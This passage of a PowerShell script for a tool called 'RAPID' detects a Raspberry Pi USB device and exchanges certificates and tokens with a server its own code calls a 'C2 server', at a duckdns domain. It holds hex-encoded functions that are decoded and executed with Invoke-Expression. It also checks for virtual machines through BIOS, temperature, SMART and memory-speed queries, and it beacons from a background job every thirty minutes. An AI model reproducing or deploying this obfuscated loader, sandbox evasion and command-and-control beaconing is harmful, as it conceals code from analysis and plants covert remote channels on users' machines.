202020207d0d0a7d0d0a0d0a66756e6374696f6e20436865636b5f43415f43657274207b0d0a20202020747279207b0d0a202020202020202024656e637279707465645f6b6579203d204765742d456e637279707465642d4b65790d0a2020202020202020696620282d6e6f742024656e637279707465645f6b657929207b0d0a20202020202020202020202057726974652d486f737420224661696c656420746f2067657420656e63727970746564204665726e6574206b65792e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a0d0a202020202020202024656e637279707465645f63657274203d204765742d43322d43657274202d656e637279707465645f6b65792024656e637279707465645f6b65790d0a2020202020202020696620282d6e6f742024656e637279707465645f6365727429207b0d0a20202020202020202020202057726974652d486f737420224661696c656420746f2067657420656e6372797074656420433220726f6f742063657274696669636174652e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a0d0a202020202020202024726573706f6e7365203d205665726966792d43322d43657274202d656e637279707465645f636572742024656e637279707465645f636572740d0a20202020202020206966202824726573706f6e73652e737461747573202d657120226e65775f636572745f6e65656465642229207b0d0a20202020202020202020202057726974652d486f737420224e657720726f6f74206365727469666963617465206e65656465642e2050726f63656564696e6720776974682048616e646c655f4365727469666963617465735f4f6e63652e220d0a20202020202020202020202072657475726e2024726573706f6e73652e7374617475730d0a20202020202020207d20656c73656966202824726573706f6e73652e737461747573202d6571202276616c69642229207b0d0a20202020202020202020202057726974652d486f73742022433220726f6f742063657274696669636174652069732076616c69642e220d0a20202020202020202020202072657475726e2024726573706f6e73652e7374617475730d0a20202020202020207d20656c7365207b0d0a20202020202020202020202057726974652d4572726f7220224661696c656420746f2076657269667920433220726f6f742063657274696669636174652e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f722022416e206572726f72206f6363757272656420647572696e672043412063657274696669636174652068616e646c696e673a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f546f6b656e5f546f5f466c61736b207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24636f6d62696e65645f656e637279707465645f646174610d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f726563656976655f746f6b656e22202d4d6574686f6420506f7374202d426f64792028407b2064617461203d2024636f6d62696e65645f656e637279707465645f64617461207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f737420225265646972656374656420456e6372797074656420546f6b656e206461746120746f20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f20726564697265637420636f6d62696e656420656e63727970746564206461746120746f20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2048616e646c655f4365727469666963617465735f4f6e6365207b0d0a20202020706172616d20282473747564656e746964290d0a202020206966202849735f436f6e6e6563746564202d6e6520246e756c6c29207b0d0a2020202020202020747279207b0d0a2020202020202020202020202463615f636572745f737461747573203d20436865636b5f43415f436572740d0a202020202020202020202020696620282463615f636572745f737461747573202d657120226e65775f636572745f6e65656465642229207b0d0a20202020202020202020202020202020246373725f726573706f6e7365203d2046657463685f435352202d73747564656e746964202473747564656e7469640d0a2020202020202020202020202020202069662028246373725f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f636572745f726573706f6e7365203d2053656e645f435352202d6373725f726573706f6e736520246373725f726573706f6e73650d0a2020202020202020202020202020202069662028247369676e65645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20676574207369676e65642063657274696669636174652e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f63657274203d20247369676e65645f636572745f726573706f6e73652e636572740d0a202020202020202020202020202020202473656e645f636572745f726573706f6e7365203d2053656e645f5369676e65645f43657274202d7369676e65645f6365727420247369676e65645f636572740d0a20202020202020202020202020202020696620282473656e645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665722e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a2020202020202020202020202020202057726974652d486f7374202243657274696669636174652068616e646c696e672070726f6365737320636f6d706c65746564207375636365737366756c6c792e22202d466f726567726f756e64436f6c6f7220477265656e0d0a2020202020202020202020207d20656c7365696620282463615f636572745f737461747573202d6571202276616c69642229207b0d0a2020202020202020202020202020202024636572745f726573706f6e7365203d20436865636b5f436572740d0a202020202020202020202020202020206966202824636572745f726573706f6e73652e737461747573202d65712022636572745f6578697374732229207b0d0a20202020202020202020202020202020202020206966202824636572745f726573706f6e73652e737461747573202d65712022636572745f6578697374732229207b0d0a202020202020202020202020202020202020202020202020247665726966795f726573706f6e7365203d205665726966795f43657274202d636572745f726573706f6e73652024636572745f726573706f6e73650d0a20202020202020202020202020202020202020202020202069662028247665726966795f726573706f6e73652e737461747573202d65712022737563636573732229207b0d0a2020202020202020202020202020202020202020202020202020202057726974652d486f7374202243657274696669636174652069732076616c69642e22202d466f726567726f756e64436f6c6f7220477265656e0d0a0d0a20202020202020202020202020202020202020202020202020202020232052656469726563742074686520726573706f6e736520746f20466c61736b207365727665720d0a202020202020202020202020202020202020202020202020202020202472656469726563745f726573706f6e7365203d2053656e645f546f6b656e5f546f5f466c61736b202d636f6d62696e65645f656e637279707465645f6461746120247665726966795f726573706f6e73652e6d6573736167650d0a20202020202020202020202020202020202020202020202020202020696620282472656469726563745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20726564697265637420726573706f6e736520746f20466c61736b207365727665722e220d0a202020202020202020202020202020202020202020202020202020207d0d0a2020202020202020202020202020202020202020202020202020202072657475726e0d0a2020202020202020202020202020202020202020202020207d20656c736569662028247665726966795f726573706f6e73652e737461747573202d657120226572726f722229207b0d0a202020202020202020202020202020202020202020202020202020207377697463682028247665726966795f726573706f6e73652e6d65737361676529207b0d0a202020202020202020202020202020202020202020202020202020202020202022436572746966696361746520686173206265656e207265766f6b65642e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f722022436572746966696361746520686173206265656e207265766f6b65642e2041626f7274696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020202020202072657475726e0d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020202020202022496e76616c6964207369676e61747572652e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224365727469666963617465207369676e617475726520697320696e76616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a20202020202020202020202020202020202020202020202020202020202020202254696d657374616d70206973206f7574736964652074686520616c6c6f7765642074696d652077696e646f772e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f72202243657274696669636174652074696d657374616d7020697320696e76616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020202020202064656661756c74207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224365727469666963617465206973206e6f742076616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020207d0d0a2020202020202020202020202020202020202020202020207d0d0a20202020202020202020202020202020202020207d0d0a202020202020202020202020202020207d20656c7365207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224e6f20636572746966696361746520666f756e64206f6e20466c61736b207365727665722e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020246373725f726573706f6e7365203d2046657463685f435352202d73747564656e746964202473747564656e7469640d0a2020202020202020202020202020202069662028246373725f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f636572745f726573706f6e7365203d2053656e645f435352202d6373725f726573706f6e736520246373725f726573706f6e73650d0a2020202020202020202020202020202069662028247369676e65645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20676574207369676e65642063657274696669636174652e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f63657274203d20247369676e65645f636572745f726573706f6e73652e636572740d0a202020202020202020202020202020202473656e645f636572745f726573706f6e7365203d2053656e645f5369676e65645f43657274202d7369676e65645f6365727420247369676e65645f636572740d0a20202020202020202020202020202020696620282473656e645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665722e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a2020202020202020202020202020202057726974652d486f7374202243657274696669636174652068616e646c696e672070726f6365737320636f6d706c65746564207375636365737366756c6c792e22202d466f726567726f756e64436f6c6f7220477265656e0d0a2020202020202020202020207d20656c7365207b0d0a2020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2068616e646c652043412063657274696669636174652e220d0a2020202020202020202020207d0d0a20202020202020207d206361746368207b0d0a20202020202020202020202057726974652d4572726f722022416e206572726f72206f6363757272656420647572696e67207468652063657274696669636174652068616e646c696e672070726f636573733a20245f220d0a20202020202020207d0d0a202020207d0d0a7d
"@

    # Convert the hex string back to byte array
    $byteArray = @()
    for ($i = 0; $i -lt $hexFunctions.Length; $i += 2) {
        $byteArray += [Convert]::ToByte($hexFunctions.Substring($i, 2), 16)
    }

    # Convert the byte array to string content
    $decodedContent = [System.Text.Encoding]::UTF8.GetString($byteArray)

    # Execute the decoded content
    Invoke-Expression $decodedContent

    while ($true) {
        # Step 1: Check for existing certificate
        $cert_response = Check_Cert
        if ($cert_response.status -eq "cert_exists") {
            Write-Host "Existing certificate found. Verifying..."

            # Step 2: Verify the existing certificate
            $verify_response = Verify_Cert -cert_response $cert_response -c2_verify_url $c2_verify_url
            if ($verify_response.status -eq "success") {
                Write-Host "Certificate is valid." -ForegroundColor Green

                # Step 3: Redirect the token to the Flask server
                $redirect_response = Send_Token_To_Flask -combined_encrypted_data $verify_response.message -base_url $base_url
                if ($redirect_response -eq $null) {
                    Write-Error "Failed to redirect response to Flask server."
                } else {
                    Write-Host "Token successfully sent to Flask server." -ForegroundColor Green
                }
            } else {
                Write-Error "Verification of certificate failed: $($verify_response.error)"
            }
        } else {
            Write-Host "No valid certificate found. Exiting job."
        }

        Start-Sleep -Seconds 1800
    }
}

# Update Token Job
$jobParams = @{
    ScriptBlock = $jobScriptBlock
    ArgumentList = @('http://10.0.0.1:8000', 'https://rapid.tlnas.duckdns.org/verify_cert.php')
}
$RefreshToken = Start-Job @jobParams

# Function: Determine if Raspberry Pi is connected to the PC
# Finding for USB with VID 1D6B. VID is the Vendor ID set by us when configuring composite mode on Raspberry Pi
function Is_Connected {
    $check = $null
    $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }

    if ($null -ne $check) {
        return 'FOUND'
    }
}

if (Is_Connected -ne $null) {
    function Encode($data){
        return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
    }
    $key = 'https://rapid.tlnas.duckdns.org/get_public_key.php'
    $base_url = "http://10.0.0.1:8000"
    $sending_base = 'https://rapid.tlnas.duckdns.org/process.php'
    $pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
    $key_data = @{PuK = Encode($($pub_key.tostring()))}
    $response = Invoke-WebRequest -Uri http://10.0.0.1:8000/ -Method POST -Body ($key_data|ConvertTo-Json) -ContentType 'application/json'
    $uuid = ($response.content | ConvertFrom-Json).uuid
    Write-Host $uuid

    # Load Windows Forms
    Add-Type -AssemblyName System.Windows.Forms

    # ======================================================================================================================================
                                                            # VM DETECTION STARTS HERE
    # ======================================================================================================================================

    # ================================== Detect VM based on BIOS information ==========================================
    $BiosInfo = Get-WmiObject -Class Win32_BIOS | Format-List *

    # Convert $BiosInfo to string to make it searchable
    $BiosInfoString = $BiosInfo | Out-String

    # Define an array of keywords
    $VMkeywords = @("VBOX ", "VirtualBox", "VMware", "VMW")

    # Initialize a flag to track if any keyword is found
    $VMfound = $false

    # Check if any of the keywords are present in $BiosInfoString
    foreach ($VMkeyword in $VMkeywords) {
        if ($BiosInfoString -match $VMkeyword) {
            $VMfound = $true
            break
        }
    }

    # ==================================== Detect VM based on Temperature ==========================================

    # Code for detecting if temperature can be detected
    try {
        $Temperature = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction Stop
        # Handle the successful case if needed
    } catch {
        if ($_.Exception.Message -match "Not supported") {
            # Prevent message box pop up to account for some systems not supporting this WmiObject
            # $messageBox = [System.Windows.Forms.MessageBox]::Show("(Temperature)Virtual machine software detected. Rapid can't be used in virtual machine software.", "RAPID", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
            # ============ TO BE DELETED BEFORE RELEASING =================
            # ============ SEND DATA TO WEB SERVER ============================
            $VM += "VM possibly detected, temperature not supported on the PC"
            # Write-Output "An unexpected error occurred: $_"
            # break
        }else{
        }
    }

    # ================================== Detect VM based on SMART DATA information ==========================================
    try {
        $SMART =  Get-WmiObject -Namespace "root\wmi" -Class MSStorageDriver_FailurePredictStatus -ErrorAction Stop
        # Handle the successful case if needed
    } catch {
        if ($_.Exception.Message -match "Not supported") {
            $messageBox = [System.Windows.Forms.MessageBox]::Show("(SMARTDATA)Virtual machine software detected. Rapid can't be used in virtual machine software.", "RAPID", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
            # ============ TO BE DELETED BEFORE RELEASING =================
            # ============ SEND DATA TO WEB SERVER ============================
            $VM += "VM detected, no SMART DATA info found"
            $VMfound = $true
            Write-Output "An unexpected error occurred: $_"
            # break
        }else{
        }
    }

    # ==================================== Detect VM based on Memory speed information ==========================================
    $MemoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | select speed

    # Display the memory speed information
    if ($MemoryInfo -and $MemoryInfo.Speed -ne $null -and $MemoryInfo.Speed -ne '') {
        Write-Output "Memory speed information:"
        $MemoryInfo | Format-Table -AutoSize
    } else {
        # ============ SEND DATA TO WEB SERVER ============================
        $messageBox = [System.Windows.Forms.MessageBox]::Show("(MEMORY SPEED)Virtual machine software detected. Rapid can't be used in virtual machine software.", "RAPID", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        Write-Output "No valid memory speed information found."
        $VMfound = $true
        $VM += "VM detected, no memory speed info found"
        # break
    }

    if($VMfound -eq $true){
        Write-Host $VM
        # Send the captured data to the server
        try {
            $sending_base = 'https://rapid.tlnas.duckdns.org/process.php'
            $body = @{VM = Encode($VM)}
            $response = Invoke-WebRequest -Uri $base_url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
            Write-Host "Data sent to C2 server successfully."
            break
        } catch {
            Write-Error "Failed to send VM detection data to C2 server: $_"
                return
            }
        } else {
            Write-Host "NO VM DETECTED"
        }
} else {break}

# Update Token Job
$jobScriptBlock = {
    param($base_url, $c2_verify_url)

    $hexFunctions = @"
    232046756e6374696f6e732e7073310d0a0d0a66756e6374696f6e2049735f436f6e6e6563746564207b0d0a2020202024636865636b203d204765742d506e70446576696365202d50726573656e744f6e6c79207c2057686572652d4f626a656374207b20245f2e496e7374616e63654964202d6d6174636820275e5553425c5c5649445f3144364227207d0d0a202020206966202824636865636b29207b0d0a202020202020202057726974652d486f7374202252617370626572727920506920636f6e6e65637465642e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2027464f554e44270d0a202020207d20656c7365207b0d0a202020202020202057726974652d486f73742022526173706265727279205069206e6f7420636f6e6e65637465642e22202d466f726567726f756e64436f6c6f72205265640d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e204765742d456e637279707465642d4b6579207b0d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f6765745f656e637279707465645f6b657922202d4d6574686f64204765740d0a202020202020202057726974652d486f737420224665746368656420656e63727970746564206b65792066726f6d20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73652e656e637279707465645f6b65790d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2067657420656e63727970746564206b65792066726f6d20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e204765742d43322d43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24656e637279707465645f6b65790d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d55726920222463325f726f6f745f63615f75726c22202d4d6574686f6420506f7374202d426f64792028407b206b6579203d2024656e637279707465645f6b6579207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f737420224665746368656420656e6372797074656420433220726f6f742063657274696669636174652e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73652e636572740d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2067657420656e6372797074656420433220726f6f742063657274696669636174653a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e205665726966792d43322d43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24656e637279707465645f636572740d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f7665726966795f63325f6365727422202d4d6574686f6420506f7374202d426f64792028407b2063657274203d2024656e637279707465645f63657274207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f73742022566572696669656420433220726f6f74206365727469666963617465206f6e20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2076657269667920433220726f6f74206365727469666963617465206f6e20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2046657463685f435352207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d2473747564656e7469640d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f6765745f63737222202d4d6574686f6420476574202d426f647920407b2073747564656e746964203d202473747564656e746964207d202d436f6e74656e745479706520226170706c69636174696f6e2f6a736f6e220d0a202020202020202057726974652d486f7374202246657463686564204353522066726f6d20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522066726f6d20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f435352207b0d0a20202020706172616d20280d0a20202020202020205b5053437573746f6d4f626a6563745d246373725f726573706f6e73650d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202463325f7369676e696e675f75726c202d4d6574686f6420506f7374202d426f64792028246373725f726573706f6e7365207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202253656e742043535220746f2043322053657276657220616e64207265636569766564207369676e65642063657274696669636174652e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202057726974652d486f73742024726573706f6e73650d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2073656e642043535220746f204332205365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f5369676e65645f43657274207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d247369676e65645f636572740d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f726563656976655f6365727422202d4d6574686f6420506f7374202d426f64792028407b2063657274203d20247369676e65645f63657274207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202253656e74207369676e6564206365727469666963617465206261636b20746f20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e20436865636b5f43657274207b0d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f636865636b5f6365727422202d4d6574686f64204765740d0a202020202020202057726974652d486f73742022436865636b656420666f72206578697374696e67206365727469666963617465206f6e20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f20636865636b20666f72206365727469666963617465206f6e20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e205665726966795f43657274207b0d0a20202020706172616d20280d0a20202020202020205b5053437573746f6d4f626a6563745d24636572745f726573706f6e73650d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202463325f7665726966795f75726c202d4d6574686f6420506f7374202d426f6479202824636572745f726573706f6e7365207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f7374202256657269666965642063657274696669636174652077697468204332205365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f207665726966792063657274696669636174652077697468204332205365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e20436865636b5f43415f43657274207b0d0a20202020747279207b0d0a202020202020202024656e637279707465645f6b6579203d204765742d456e637279707465642d4b65790d0a2020202020202020696620282d6e6f742024656e637279707465645f6b657929207b0d0a20202020202020202020202057726974652d486f737420224661696c656420746f2067657420656e63727970746564204665726e6574206b65792e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a0d0a202020202020202024656e637279707465645f63657274203d204765742d43322d43657274202d656e637279707465645f6b65792024656e637279707465645f6b65790d0a2020202020202020696620282d6e6f742024656e637279707465645f6365727429207b0d0a20202020202020202020202057726974652d486f737420224661696c656420746f2067657420656e6372797074656420433220726f6f742063657274696669636174652e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a0d0a202020202020202024726573706f6e7365203d205665726966792d43322d43657274202d656e637279707465645f636572742024656e637279707465645f636572740d0a20202020202020206966202824726573706f6e73652e737461747573202d657120226e65775f636572745f6e65656465642229207b0d0a20202020202020202020202057726974652d486f737420224e657720726f6f74206365727469666963617465206e65656465642e2050726f63656564696e6720776974682048616e646c655f4365727469666963617465735f4f6e63652e220d0a20202020202020202020202072657475726e2024726573706f6e73652e7374617475730d0a20202020202020207d20656c73656966202824726573706f6e73652e737461747573202d6571202276616c69642229207b0d0a20202020202020202020202057726974652d486f73742022433220726f6f742063657274696669636174652069732076616c69642e220d0a20202020202020202020202072657475726e2024726573706f6e73652e7374617475730d0a20202020202020207d20656c7365207b0d0a20202020202020202020202057726974652d4572726f7220224661696c656420746f2076657269667920433220726f6f742063657274696669636174652e2045786974696e672066756e6374696f6e2e220d0a20202020202020202020202072657475726e20246e756c6c0d0a20202020202020207d0d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f722022416e206572726f72206f6363757272656420647572696e672043412063657274696669636174652068616e646c696e673a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2053656e645f546f6b656e5f546f5f466c61736b207b0d0a20202020706172616d20280d0a20202020202020205b737472696e675d24636f6d62696e65645f656e637279707465645f646174610d0a20202020290d0a20202020747279207b0d0a202020202020202024726573706f6e7365203d20496e766f6b652d526573744d6574686f64202d557269202224626173655f75726c2f726563656976655f746f6b656e22202d4d6574686f6420506f7374202d426f64792028407b2064617461203d2024636f6d62696e65645f656e637279707465645f64617461207d207c20436f6e76657274546f2d4a736f6e29202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e270d0a202020202020202057726974652d486f737420225265646972656374656420456e6372797074656420546f6b656e206461746120746f20466c61736b207365727665722e22202d466f726567726f756e64436f6c6f7220477265656e0d0a202020202020202072657475726e2024726573706f6e73650d0a202020207d206361746368207b0d0a202020202020202057726974652d4572726f7220224661696c656420746f20726564697265637420636f6d62696e656420656e63727970746564206461746120746f20466c61736b207365727665723a20245f220d0a202020202020202072657475726e20246e756c6c0d0a202020207d0d0a7d0d0a0d0a66756e6374696f6e2048616e646c655f4365727469666963617465735f4f6e6365207b0d0a20202020706172616d20282473747564656e746964290d0a202020206966202849735f436f6e6e6563746564202d6e6520246e756c6c29207b0d0a2020202020202020747279207b0d0a2020202020202020202020202463615f636572745f737461747573203d20436865636b5f43415f436572740d0a202020202020202020202020696620282463615f636572745f737461747573202d657120226e65775f636572745f6e65656465642229207b0d0a20202020202020202020202020202020246373725f726573706f6e7365203d2046657463685f435352202d73747564656e746964202473747564656e7469640d0a2020202020202020202020202020202069662028246373725f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f636572745f726573706f6e7365203d2053656e645f435352202d6373725f726573706f6e736520246373725f726573706f6e73650d0a2020202020202020202020202020202069662028247369676e65645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20676574207369676e65642063657274696669636174652e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f63657274203d20247369676e65645f636572745f726573706f6e73652e636572740d0a202020202020202020202020202020202473656e645f636572745f726573706f6e7365203d2053656e645f5369676e65645f43657274202d7369676e65645f6365727420247369676e65645f636572740d0a20202020202020202020202020202020696620282473656e645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665722e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a2020202020202020202020202020202057726974652d486f7374202243657274696669636174652068616e646c696e672070726f6365737320636f6d706c65746564207375636365737366756c6c792e22202d466f726567726f756e64436f6c6f7220477265656e0d0a2020202020202020202020207d20656c7365696620282463615f636572745f737461747573202d6571202276616c69642229207b0d0a2020202020202020202020202020202024636572745f726573706f6e7365203d20436865636b5f436572740d0a202020202020202020202020202020206966202824636572745f726573706f6e73652e737461747573202d65712022636572745f6578697374732229207b0d0a20202020202020202020202020202020202020206966202824636572745f726573706f6e73652e737461747573202d65712022636572745f6578697374732229207b0d0a202020202020202020202020202020202020202020202020247665726966795f